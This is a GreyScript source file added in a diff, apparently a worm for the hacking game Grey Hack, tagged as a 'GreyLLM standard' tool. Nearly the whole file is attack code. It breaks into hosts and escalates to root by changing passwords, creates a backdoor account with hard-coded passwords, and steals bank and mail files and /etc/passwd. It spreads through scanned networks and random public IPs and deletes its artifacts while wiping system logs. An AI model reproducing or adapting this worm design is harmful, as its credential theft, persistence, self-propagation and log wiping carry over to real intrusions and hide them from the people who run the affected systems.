@@ -1,0 +1,635 @@
+// worm — aggressive staged harvesting worm (GreyLLM standard)
+// WORM_VERSION = "2" (daemon auto-installs/updates this file)
+//
+// Per host: break in with the standard ~/exploit tool, ESCALATE LOCALLY
+// to root (victim-side exploit -L, password-change attempts, root
+// reconnect), harvest bank/mail credentials as root when possible,
+// discover that network's attack surface, add random public IPs, clean
+// every trace, move to the next host. If root is impossible the host is
+// still harvested with the durable user and the infection moves on.
+//
+// usage (from your home machine):
+//   worm [ip ...] [flags]      harvest run (ips seed the frontier)
+//     -g=N   generations this run             (default 1)
+//     -t=N   max hosts per generation         (default 3, cap 10)
+//     -r=N   random public IPs added per gen  (default 2, cap 8)
+//     -o=P   exfil file, appended per host    (default ~/Desktop/bankintel.txt)
+//     -s=P   state file                       (default ~/worm.state)
+//     -u=U -w=P   durable creds on victims    (default worm / W0rmP@ss1x)
+//     -rp=P  password tried for root changes  (default R00tP@ss1x)
+//
+// internal mode (launched BY the worm on a victim):
+//   worm -scan -o=PATH     print "ip=A port=N" lines for that network
+//
+// Mechanics (all verified in-game): footholds only via ~/exploit (this
+// worm never fires overflow()); victim entry via connect_service with
+// the durable user; LOCAL root escalation runs ON the victim (its own
+// metaxploit + /lib); cross-machine file moves use text drop+build or
+// shell.scp (get_content refuses binary files); every victim ends with
+// artifact deletion and a wiped /var/system.log. GreyScript has no
+// try/catch: every call below is null/typeof-guarded, loops are
+// bounded, and state is saved after EVERY host so any death resumes.
+
+NL = char(10)
+
+containsStr = function(hay, needle)
+	if hay == null then
+		return false
+	end if
+	return hay.indexOf(needle) != null
+end function
+
+ensureFolder = function(comp, path)
+	f = comp.File(path)
+	if f != null then
+		return f
+	end if
+	parts = path.split("/")
+	name = parts[parts.len - 1]
+	r = comp.create_folder(parent_path(path), name)
+	f = comp.File(path)
+	if f == null then
+		print("cannot create folder " + path + " (" + r + ")")
+	end if
+	return f
+end function
+
+ensureFile = function(comp, path, initial)
+	f = comp.File(path)
+	if f != null then
+		return f
+	end if
+	parts = path.split("/")
+	name = parts[parts.len - 1]
+	comp.touch(parent_path(path), name)
+	f = comp.File(path)
+	if f == null then
+		return null
+	end if
+	if initial != null then
+		f.set_content(initial)
+	end if
+	return f
+end function
+
+readFileOr = function(comp, path, fallback)
+	f = comp.File(path)
+	if f == null then
+		return fallback
+	end if
+	c = f.get_content
+	if c == null then
+		return fallback
+	end if
+	return c
+end function
+
+appendFile = function(comp, path, text)
+	f = ensureFile(comp, path, null)
+	if f == null then
+		print("cannot write " + path)
+		return null
+	end if
+	base = f.get_content
+	if base == null then
+		base = ""
+	end if
+	f.set_content(base + text)
+	return null
+end function
+
+rndByte = function(salt)
+	// rnd() is deterministic per session — mix the wall clock so every
+	// run explores different addresses
+	t = time() + salt * 7919
+	s = str(t * 2654435761)
+	digits = s.replace(".", "").replace("-", "")
+	n = val(digits[1:]) % 254
+	if n == null or n < 1 then
+		n = salt % 254 + 1
+	end if
+	return n
+end function
+
+rndPublicIp = function(counter)
+	a = rndByte(counter)
+	b = rndByte(counter + 1)
+	c = rndByte(counter + 3)
+	d = rndByte(counter + 7)
+	// keep clear of private/reserved ranges
+	if a == 10 or a == 127 or a == 172 or a == 192 or a < 20 then
+		a = a % 100 + 30
+	end if
+	return a + "." + b + "." + c + "." + d
+end function
+
+// ---- state: "F|ip" frontier, "O|ip|user|pass" owned, "D|ip" done ----
+
+stateLoad = function(comp, path)
+	frontier = []
+	owned = []
+	done = []
+	raw = readFileOr(comp, path, "")
+	if raw == "" then
+		return [frontier, owned, done]
+	end if
+	lines = raw.split(NL)
+	for line in lines
+		line = line.trim
+		if line == "" then
+			continue
+		end if
+		if line.indexOf("F|") == 0 then
+			frontier.push(line[2:])
+		else if line.indexOf("O|") == 0 then
+			parts = line.split("|")
+			if parts.len >= 4 then
+				owned.push([parts[1], parts[2], parts[3]])
+			end if
+		else if line.indexOf("D|") == 0 then
+			done.push(line[2:])
+		end if
+	end for
+	return [frontier, owned, done]
+end function
+
+stateSave = function(comp, path, frontier, owned, done)
+	out = ""
+	for ip in frontier
+		out = out + "F|" + ip + NL
+	end for
+	for o in owned
+		out = out + "O|" + o[0] + "|" + o[1] + "|" + o[2] + NL
+	end for
+	for ip in done
+		out = out + "D|" + ip + NL
+	end for
+	f = ensureFile(comp, path, null)
+	if f != null then
+		f.set_content(out)
+	end if
+	return null
+end function
+
+knownIp = function(frontier, owned, done, ip)
+	for x in frontier
+		if x == ip then
+			return true
+		end if
+	end for
+	for o in owned
+		if o[0] == ip then
+			return true
+		end if
+	end for
+	for x in done
+		if x == ip then
+			return true
+		end if
+	end for
+	return false
+end function
+
+// ---- victim pipeline ----
+
+harvestHomes = function(comp, exfilPath, tag, vic)
+	// steal every readable bank/mail file from every user home
+	home = vic.File("/home")
+	if home == null then
+		return 0
+	end if
+	users = home.get_folders
+	if users == null then
+		return 0
+	end if
+	got = 0
+	for uf in users
+		files = uf.get_files
+		if files == null then
+			continue
+		end if
+		for f in files
+			nm = f.name.lower
+			if containsStr(nm, "bank") or containsStr(nm, "mail") then
+				content = f.get_content
+				if content == null then
+					continue
+				end if
+				appendFile(comp, exfilPath, "== " + tag + " " + uf.name + "/" + f.name + " ==" + NL + content + NL)
+				got = got + 1
+			end if
+		end for
+	end for
+	return got
+end function
+
+harvestRootExtras = function(comp, exfilPath, tag, vic)
+	// root-only loot: the full account table (hashes crack offline)
+	pw = vic.File("/etc/passwd")
+	if pw != null then
+		c = pw.get_content
+		if c != null then
+			appendFile(comp, exfilPath, "== " + tag + " /etc/passwd ==" + NL + c + NL)
+		end if
+	end if
+	return null
+end function
+
+dropText = function(vic, path, content)
+	// write a TEXT file on the victim (binary transfer needs scp)
+	parts = path.split("/")
+	name = parts[parts.len - 1]
+	vic.touch(parent_path(path), name)
+	f = vic.File(path)
+	if f == null then
+		return false
+	end if
+	f.set_content(content)
+	return true
+end function
+
+cleanDrops = function(vic, vhome, names)
+	for nm in names
+		f = vic.File(vhome + "/" + nm)
+		if f != null then
+			f.delete
+		end if
+	end for
+	return null
+end function
+
+clearLog = function(vic)
+	lf = vic.File("/var/system.log")
+	if lf != null then
+		lf.set_content(" ")
+	end if
+	return null
+end function
+
+escalateLocal = function(comp, sh, vhome, user, pass, rootPass)
+	// escalate to root FROM INSIDE the victim: build the standard
+	// exploit there and fire its LOCAL /lib attacks. Password-change
+	// vulns fire with rootPass; footholds convert to durable access.
+	// Returns "root" when a root shell login succeeded.
+	b = sh.build(vhome + "/exploit.src", vhome)
+	if b != "" then
+		print("  escalate: victim-side build failed: " + b)
+		return "none"
+	end if
+	metaxLocal = sh.host_computer.File("/lib/metaxploit.so")
+	mFlag = ""
+	if metaxLocal == null then
+		shipped = sh.host_computer.File(vhome + "/metaxploit.so")
+		if shipped != null then
+			mFlag = " -m=" + vhome + "/metaxploit.so"
+		else
+			print("  escalate: no metaxploit on victim — cannot escalate")
+			return "none"
+		end if
+	end if
+	// the -L run writes its report on the victim
+	lr = sh.launch(vhome + "/exploit", "-L -u=" + user + " -w=" + pass + " -g=" + rootPass + mFlag)
+	if lr != 1 then
+		print("  escalate: local run failed: " + lr)
+		return "none"
+	end if
+	report = readFileOr(sh.host_computer, vhome + "/exploit_out.txt", "")
+	if report == null then
+		report = ""
+	end if
+	if containsStr(report, "FOOTHOLD shell") then
+		// the tool already created/re-created the durable user from the
+		// foothold — check whether that foothold was root and try a root
+		// login via the changed password anyway
+		print("  escalate: local foothold gained" + "")
+	end if
+	if containsStr(report, "SUCCESS") == false then
+		return "tried"
+	end if
+	// a password-change fired — root may now accept rootPass
+	rootSh = get_shell.connect_service(ipOf(sh), 22, "root", rootPass)
+	if typeof(rootSh) == "shell" then
+		print("  escalate: ROOT via password change")
+		return ["root", rootSh]
+	end if
+	return "tried"
+end function
+
+ipOf = function(sh)
+	// best-effort public ip of the machine a shell lives on
+	c = sh.host_computer
+	if c == null then
+		return "0.0.0.0"
+	end if
+	p = c.public_ip
+	if p == null then
+		return "0.0.0.0"
+	end if
+	return p
+end function
+
+processVictim = function(comp, ip, exfilPath, user, pass, rootPass, exSrc, wormSrc)
+	// returns ["owned", newIps], "done", or "skip"
+	mark = "worm: " + ip
+	shell = get_shell
+
+	// 0. ensure our standard tool exists (self-heal compile)
+	expBin = comp.File(home_dir + "/exploit")
+	if expBin == null then
+		b = shell.build(home_dir + "/exploit.src", home_dir)
+		if b != "" then
+			print(mark + ": no ~/exploit and build failed: " + b)
+			return "skip"
+		end if
+	end if
+
+	// 1. break in (quiet: no-requirement exploits only)
+	outPath = home_dir + "/.greyllm/out.txt"
+	outF = ensureFile(comp, outPath, " ")
+	if outF != null then
+		outF.set_content(" ")
+	end if
+	lr = shell.launch(home_dir + "/exploit", ip + " -q -u=" + user + " -w=" + pass)
+	if lr != 1 then
+		print(mark + ": exploit launch failed: " + lr)
+		return "skip"
+	end if
+	report = readFileOr(comp, outPath, "")
+	if containsStr(report, "FOOTHOLD") == false and containsStr(report, "SUCCESS") == false then
+		print(mark + ": no entry (requirements unmet or nothing there)")
+		return "done"
+	end if
+
+	// 2. enter with the durable user
+	sh = shell.connect_service(ip, 22, user, pass)
+	if typeof(sh) != "shell" then
+		print(mark + ": durable login refused (" + sh + ")")
+		return "done"
+	end if
+	vic = sh.host_computer
+	if vic == null then
+		print(mark + ": shell without host_computer")
+		return "done"
+	end if
+	vhome = "/home/" + user
+	drops = []
+
+	// 3. drop our sources + metaxploit if the victim lacks it
+	if exSrc != null then
+		if dropText(vic, vhome + "/exploit.src", exSrc) then
+			drops.push("exploit.src")
+		end if
+	end if
+	if wormSrc != null then
+		if dropText(vic, vhome + "/worm.src", wormSrc) then
+			drops.push("worm.src")
+		end if
+	end if
+	if vic.File("/lib/metaxploit.so") == null then
+		sc = sh.scp("/lib/metaxploit.so", vhome + "/", shell)
+		if typeof(sc) == "string" then
+			print(mark + ": metaxploit scp failed: " + sc)
+		else
+			drops.push("metaxploit.so")
+		end if
+	end if
+
+	// 4. ESCALATE — root before harvest (root reads every home)
+	harvestShell = sh
+	rooted = false
+	if exSrc != null and drops.indexOf("exploit.src") != null then
+		esc = escalateLocal(comp, sh, vhome, user, pass, rootPass)
+		if typeof(esc) == "list" then
+			harvestShell = esc[1]
+			rooted = true
+		end if
+		drops.push("exploit_out.txt")
+	end if
+	hv = harvestShell.host_computer
+	if hv == null then
+		hv = vic
+	end if
+
+	// 5. harvest credentials (as root when we got it)
+	got = harvestHomes(comp, exfilPath, ip, hv)
+	if rooted then
+		harvestRootExtras(comp, exfilPath, ip, hv)
+	end if
+	badge = " [user]"
+	if rooted then
+		badge = " [ROOT]"
+	end if
+	print(mark + badge + ": harvested " + got + " credential files")
+
+	// 6. spread — scan the victim's network from inside it
+	newIps = []
+	if drops.indexOf("worm.src") != null then
+		b2 = sh.build(vhome + "/worm.src", vhome)
+		if b2 == "" then
+			lr2 = sh.launch(vhome + "/worm", "-scan -o=" + vhome + "/wscan.txt")
+			if lr2 == 1 then
+				scan = readFileOr(vic, vhome + "/wscan.txt", "")
+				if scan != null and scan != "" then
+					for line in scan.split(NL)
+						line = line.trim
+						if line.indexOf("ip=") == 0 then
+							rest = line[3:]
+							sp = rest.indexOf(" ")
+							if sp == null then
+								newIps.push(rest)
+							else
+								newIps.push(rest[:sp])
+							end if
+						end if
+					end for
+				end if
+				drops.push("wscan.txt")
+			else
+				print(mark + ": victim-side scan failed: " + lr2)
+			end if
+		else
+			print(mark + ": worm build on victim failed: " + b2)
+		end if
+	end if
+	drops.push("exploit")
+	drops.push("worm")
+
+	// 7. stealth — remove every artifact, wipe the log
+	cleanDrops(vic, vhome, drops)
+	clearLog(vic)
+	print(mark + ": cleaned " + drops.len + " artifacts, log wiped")
+	return ["owned", newIps]
+end function
+
+// ---- scan mode (runs ON a victim; the parent reads the file back) ----
+
+scanMode = function(comp, outPath)
+	r = get_router
+	if r == null then
+		appendFile(comp, outPath, "scan: no router" + NL)
+		return null
+	end if
+	pub = r.public_ip
+	if pub == null then
+		appendFile(comp, outPath, "scan: no public ip" + NL)
+		return null
+	end if
+	ports = r.used_ports
+	if ports != null then
+		for p in ports
+			if p.is_closed then
+				continue
+			end if
+			appendFile(comp, outPath, "ip=" + pub + " port=" + p.port_number + NL)
+		end for
+	end if
+	devs = r.devices_lan_ip
+	if devs != null then
+		for d in devs
+			appendFile(comp, outPath, "ip=" + d + NL)
+		end for
+	end if
+	return null
+end function
+
+// ---- main ----
+
+main = function(params)
+	comp = get_shell.host_computer
+	gens = 1
+	maxT = 3
+	rndN = 2
+	exfilPath = home_dir + "/Desktop/bankintel.txt"
+	statePath = home_dir + "/worm.state"
+	user = "worm"
+	pass = "W0rmP@ss1x"
+	rootPass = "R00tP@ss1x"
+	scanOnly = false
+	outOverride = null
+	seeds = []
+	if params != null then
+		for p in params
+			if p == "-scan" then
+				scanOnly = true
+			else if p.indexOf("-g=") == 0 then
+				gens = val(p[3:])
+			else if p.indexOf("-t=") == 0 then
+				maxT = val(p[3:])
+			else if p.indexOf("-r=") == 0 then
+				rndN = val(p[3:])
+			else if p.indexOf("-o=") == 0 then
+				outOverride = p[3:]
+				exfilPath = p[3:]
+			else if p.indexOf("-s=") == 0 then
+				statePath = p[3:]
+			else if p.indexOf("-u=") == 0 then
+				user = p[3:]
+			else if p.indexOf("-w=") == 0 then
+				pass = p[3:]
+			else if p.indexOf("-rp=") == 0 then
+				rootPass = p[3:]
+			else if p.indexOf("-") != 0 then
+				seeds.push(p)
+			end if
+		end for
+	end if
+	if gens == null or gens < 1 then
+		gens = 1
+	end if
+	if maxT == null or maxT < 1 then
+		maxT = 1
+	end if
+	if maxT > 10 then
+		print("worm: capping hosts at 10 per generation")
+		maxT = 10
+	end if
+	if rndN == null or rndN < 0 then
+		rndN = 0
+	end if
+	if rndN > 8 then
+		rndN = 8
+	end if
+
+	if scanOnly then
+		outPath = outOverride
+		if outPath == null then
+			outPath = home_dir + "/wscan.txt"
+		end if
+		scanMode(comp, outPath)
+		print("worm: scan complete -> " + outPath)
+		return null
+	end if
+
+	// sources carried for spreading (text only — binaries go by scp)
+	exSrc = readFileOr(comp, home_dir + "/exploit.src", null)
+	wormSrc = readFileOr(comp, home_dir + "/worm.src", null)
+	if exSrc == null then
+		print("worm: ~/exploit.src missing — no spread or escalation this run")
+	end if
+
+	ensureFolder(comp, home_dir + "/Desktop")
+	state = stateLoad(comp, statePath)
+	frontier = state[0]
+	owned = state[1]
+	done = state[2]
+	for s in seeds
+		if knownIp(frontier, owned, done, s) == false then
+			frontier.push(s)
+		end if
+	end for
+	if frontier.len == 0 and owned.len == 0 then
+		r = get_router
+		if r != null then
+			devs = r.devices_lan_ip
+			if devs != null then
+				for d in devs
+					if knownIp(frontier, owned, done, d) == false then
+						frontier.push(d)
+					end if
+				end for
+			end if
+		end if
+	end if
+
+	rndCounter = 1
+	for g in range(1, gens)
+		// ebola fan-out: fresh random publics every generation
+		for rI in range(1, rndN)
+			rip = rndPublicIp(rndCounter + g * 31)
+			rndCounter = rndCounter + 1
+			if knownIp(frontier, owned, done, rip) == false then
+				frontier.push(rip)
+			end if
+		end for
+		worked = 0
+		while worked < maxT and frontier.len > 0
+			ip = frontier[0]
+			frontier.remove(0)
+			if is_valid_ip(ip) != 1 then
+				print("worm: skipping invalid ip " + ip)
+				done.push(ip)
+				continue
+			end if
+			res = processVictim(comp, ip, exfilPath, user, pass, rootPass, exSrc, wormSrc)
+			if typeof(res) == "list" then
+				newIps = res[1]
+				owned.push([ip, user, pass])
+				for nip in newIps
+					if knownIp(frontier, owned, done, nip) == false and is_valid_ip(nip) == 1 then
+						frontier.push(nip)
+					end if
+				end for
+			else
+				done.push(ip)
+			end if
+			worked = worked + 1
+			// saved after EVERY host: any death resumes cleanly
+			stateSave(comp, statePath, frontier, owned, done)
+		end while
+		print("worm: generation " + g + " done — frontier " + frontier.len + ", owned " + owned.len + ", done " + done.len)
+	end for
+	print("worm: run complete. exfil: " + exfilPath + " — rerun to keep spreading")
+	return null
+end function
+
+main(params)
